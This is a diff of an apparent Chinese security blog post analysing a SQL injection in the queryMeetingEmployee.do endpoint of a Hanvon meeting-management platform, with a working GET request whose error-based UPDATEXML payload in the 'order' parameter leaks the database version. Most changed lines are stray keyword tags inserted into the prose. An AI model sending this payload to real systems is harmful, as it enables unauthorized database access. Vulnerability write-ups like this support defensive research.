@@ -20,6 +20,14 @@ V1.6.x
 
 # 漏洞分析
 
+深入探索
+
+SQL注入检测
+
+网络安全
+
+编程
+
 直接看 `MobiMeetingAppController` 里关于 `queryMeetingEmployee` 的实现
 
 ```
@@ -66,9 +74,17 @@ V1.6.x
                 List<MeetingEmployeeTpm> listAll = this.meetingAsm.queryMeetingEmployee(employeeParam);
 ```
 
+深入探索
+
+计算机安全
+
+数据管理
+
+Web安全课程
+
 和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 MeetingEmployeeDsm.xml
 
-代码注入检测
+孚盟云漏洞
 
 ```
 <!--查询参会人员列表-->
@@ -118,7 +134,7 @@ V1.6.x
 >
 > 需要 meetingId 参数存在
 >
-> 漏洞扫描服务
+> 软件
 
 ```
 GET /manage/mobiMeetingApp/queryMeetingEmployee.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&meetingId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357)) HTTP/1.1
@@ -130,4 +146,4 @@ token: xxxxxx
 
 成功通过[报错注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：报错注入")爆出数据库版本信息
 
-软件安全测试
+安全研究资源
